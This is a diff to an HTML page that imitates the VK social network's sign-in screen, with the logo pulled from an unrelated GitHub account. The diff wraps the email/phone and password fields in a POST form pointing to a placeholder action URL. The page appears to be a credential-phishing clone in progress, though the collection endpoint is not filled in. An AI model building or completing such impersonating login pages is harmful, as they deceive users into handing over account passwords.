@@ -161,35 +161,41 @@ body {
             <img src="https://github.com/VK-con/Image/raw/68f56b7cefd8491c313c3f62b8896caa79e0fe39/default.png" alt="">
             <div class="header-text">Sign in to VK</div>
         </div>
-<div class="content">
-<div class="input-box">
-<input type="text" name="email_phone" placeholder="Email or phone">
-</div>
-<div class="input-box">
-<input type="password" name="password" placeholder="Password">
-</div>
-<div class="checkbox">
-<input type="checkbox" id="save_user" name="save_user">
-<label for="save_user">Save user</label>
-</div>
-<input type="submit" value="Sign In" id="signInButton">
-</div>
-  <script></script>
-<div class="footer">
-<a href="">Join VK</a>
-<a href="">Forgot your password?</a>
-</div>
-</div>
-<div class="signup-box">
-<h2>Don't have an account?</h2>
-<p>After signing up, you'll get access to all of VK's features.</p>
-<button class="signup-button">Sign Up</button>
-</div>
-<div class="footer">
-<span>&nbsp;&nbsp;&nbsp;VK@2006-2023</span>
-<a href="#">About VK</a>
-<a href="#">Terms</a>
-<a href="#">Developers</a>
-</div>
+        <!-- Add a <form> tag with name attribute -->
+        <form name="login" method="POST" action="your_action_url_here">
+            <div class="content">
+                <div class="input-box">
+                    <!-- Add name attribute for email input -->
+                    <input type="text" name="email_phone" placeholder="Email or phone">
+                </div>
+                <div class="input-box">
+                    <!-- Add name attribute for password input -->
+                    <input type="password" name="password" placeholder="Password">
+                </div>
+                <div class="checkbox">
+                    <input type="checkbox" id="save_user" name="save_user">
+                    <label for="save_user">Save user</label>
+                </div>
+                <!-- Add name attribute for submit button -->
+                <input type="submit" value="Sign In" id="signInButton" name="submit">
+            </div>
+        </form>
+        <script></script>
+        <div class="footer">
+            <a href="">Join VK</a>
+            <a href="">Forgot your password?</a>
+        </div>
+    </div>
+    <div class="signup-box">
+        <h2>Don't have an account?</h2>
+        <p>After signing up, you'll get access to all of VK's features.</p>
+        <button class="signup-button">Sign Up</button>
+    </div>
+    <div class="footer">
+        <span>&nbsp;&nbsp;&nbsp;VK@2006-2023</span>
+        <a href="#">About VK</a>
+        <a href="#">Terms</a>
+        <a href="#">Developers</a>
+    </div>
 </body>
 </html>
